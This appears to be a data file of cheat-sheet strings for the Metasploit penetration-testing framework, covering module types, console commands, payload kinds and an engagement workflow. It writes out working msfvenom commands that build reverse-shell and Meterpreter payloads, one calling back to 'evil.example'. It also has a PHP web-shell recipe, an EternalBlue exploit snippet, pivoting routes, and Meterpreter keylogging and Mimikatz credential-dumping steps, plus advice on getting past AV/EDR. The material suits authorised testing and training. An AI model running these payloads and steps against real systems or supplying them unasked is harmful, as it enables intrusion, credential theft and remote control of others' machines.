moduleTypes.name: exploit
moduleTypes.summary: Active code that abuses a specific vulnerability to gain code execution or a session on the target.

moduleTypes.name: payload
moduleTypes.summary: What runs on the target after an exploit succeeds — a reverse shell, Meterpreter, or staged delivery.

moduleTypes.name: auxiliary
moduleTypes.summary: Non-exploit modules: scanners, fuzzers, sniffers, brute-forcers, DoS tests, and protocol probes.

moduleTypes.name: post
moduleTypes.summary: Post-exploitation modules run inside an existing session — credential dumping, pivoting, persistence, enumeration.

moduleTypes.name: encoder
moduleTypes.summary: Transforms a payload to avoid bad characters or naive signatures. Less effective vs modern AV/EDR than its reputation suggests.

moduleTypes.name: nop
moduleTypes.summary: NOP-sled generators used in older stack-overflow exploits to widen the landing zone for the return address.

moduleTypes.name: evasion
moduleTypes.summary: Generates payload artefacts (EXE/DLL/ELF) with built-in evasion techniques. Treat as a starting point, not a silver bullet.

consoleCommands.description: Search modules by name, CVE, platform, or rank. e.g. `search cve:2017 type:exploit smb`.
Load a module into the current context. Tab-completion works on full paths.
Show description, options, references, and ranking for the loaded module.
List configurable options and their current values for the loaded module.
List payloads compatible with the currently loaded exploit.
List target profiles (OS / service-pack / arch) the exploit ships with.
Set an option for this module run. `setg` sets it globally across modules.
Run a non-intrusive check against the target to see if it appears vulnerable, where supported.
Execute the module. `exploit -j` runs it in the background as a job.
List active post-exploitation sessions opened by previous runs.
Interact with session N (drops you into Meterpreter or a shell).
Push the current session to the background so you can use msfconsole again.
List background module jobs (e.g. handlers waiting for callbacks).
Switch the database workspace — keeps hosts, services, and loot per engagement.
Run nmap and import results directly into the workspace database.
Query the workspace database — what nmap and scanners discovered, all queryable.
Inspect collected loot files, captured credentials, and free-form notes per workspace.
Replay a saved sequence of console commands — your engagement playbook in script form.

payloadTaxonomy.label: Staged
payloadTaxonomy.summary: A small first-stage stub connects back, then downloads the larger payload (Meterpreter) over the same socket. Smaller initial drop.

payloadTaxonomy.label: Stageless
payloadTaxonomy.summary: Whole payload delivered in one go — no second-stage download. Larger artefact, but resilient against egress filtering and easier to embed in files.

payloadTaxonomy.label: Reverse
payloadTaxonomy.summary: Target connects out to your handler. The default — works through most NAT/firewalls because outbound traffic is usually allowed.

payloadTaxonomy.label: Bind
payloadTaxonomy.summary: Target listens on a port; you connect in. Useful when outbound is blocked but the target IP is reachable from yours.

msfvenomRecipes.title: Windows reverse-TCP Meterpreter EXE
msfvenomRecipes.command: msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f exe -o shell.exe
msfvenomRecipes.details: Classic standalone payload. Pair with `exploit/multi/handler` configured for the same payload + LHOST/LPORT to catch the callback.

msfvenomRecipes.title: Linux x64 reverse shell ELF
msfvenomRecipes.command: msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f elf -o shell.elf
msfvenomRecipes.details: Plain reverse shell, no Meterpreter — useful when you want a simple sh on the other end and minimal artefacts.

msfvenomRecipes.title: PHP web-shell payload
msfvenomRecipes.command: msfvenom -p php/meterpreter_reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f raw -o shell.php
msfvenomRecipes.details: Drop into a writable web root via an upload vuln. Trigger by browsing to the file; handler catches the Meterpreter session.

msfvenomRecipes.title: Stageless payload (single transfer)
msfvenomRecipes.command: msfvenom -p windows/x64/meterpreter_reverse_https LHOST=evil.example LPORT=443 -f exe -o beacon.exe
msfvenomRecipes.details: Stageless variants ship the whole runtime in one binary — no second-stage fetch, cleaner network profile, but bigger files.

msfvenomRecipes.title: Encoded payload with iterations
msfvenomRecipes.command: msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe -o enc.exe
msfvenomRecipes.details: Encoders shuffle the byte representation for each iteration. Modern AV largely ignores them — useful for bad-char filtering, not for signature evasion.

msfvenomRecipes.title: List all payloads / formats / encoders
msfvenomRecipes.command:
msfvenom --list payloads
msfvenom --list formats
msfvenom --list encoders
msfvenomRecipes.details: When you can't remember the exact payload name, format token (exe / elf / raw / hex / war / vbs / asp), or encoder string.

meterpreterCommands.description: OS, architecture, hostname, domain, and Meterpreter build of the target.
Show the user the session is running as.
Try a set of local privilege-escalation techniques to upgrade to SYSTEM (Windows).
List running processes; `migrate PID` moves the session into another process.
Capture the desktop of the active session.
Start a keylogger in the current process and dump captured keystrokes.
Move files between attacker host and target through the session channel.
Drop into a native cmd.exe / sh on the target.
Forward a local port through the session to a remote host:port (pivoting).
Route a subnet through an existing session so other modules can reach internal targets.
Load the Kiwi (Mimikatz) extension for credential extraction.

engagementWorkflow.details: Discover hosts and services, then push them into Metasploit's database so every module can see them.
Query the workspace — Metasploit cross-references services against modules.
Load the module, point it at a host, choose a payload that fits the egress and target.
engagementWorkflow.snippet:
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.0.0.5
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 10.0.0.99

engagementWorkflow.details: Many exploits expose `check` for a non-destructive probe. Then `exploit -j` to background the run.
Once Meterpreter lands, treat it as a foothold — recon, escalate, capture creds, pivot.
Route Metasploit's traffic through the session so internal subnets become reachable.
engagementWorkflow.snippet:
route add 10.0.0.0/24 1
use auxiliary/scanner/portscan/tcp
set RHOSTS 10.0.0.0/24
run

tips: Always run inside a workspace (`workspace -a name`) per engagement — keeps hosts, creds, and loot from bleeding between cases.
`setg LHOST` and `setg RHOSTS` early in a session so you don't have to re-set them in every module.
Modules ship with a `Rank` (excellent → manual). Stick to `excellent`/`great` for production-like targets; lower ranks risk crashes.
Use `-j` to background `exploit` so you can keep working in msfconsole while the handler waits for callbacks.
`resource FILE.rc` replays canned command sequences — turn your repeatable steps into checked-in playbooks.
When AV is in play, encoded msfvenom payloads will almost certainly burn. Reach for evasion modules, custom loaders, or non-Metasploit tooling instead.
Meterpreter is loud — high-fidelity EDR detects it on touch. Use it to learn and in lab environments; expect to need stealthier tooling on real engagements.
limitations: Meterpreter and msfvenom payloads are heavily signatured. Modern AV / EDR catches most of them on disk and in memory.
Many exploits are old and target unpatched versions. Public Metasploit modules lag behind cutting-edge vulns by weeks to months.
`getsystem` and other privesc modules rely on a fixed set of techniques — they fail silently on patched / hardened hosts.
Encoders do not provide AV evasion. Their original purpose was bad-char filtering; this is a persistent misconception.
Running modules against systems you do not have written authorisation to test is illegal in most jurisdictions.
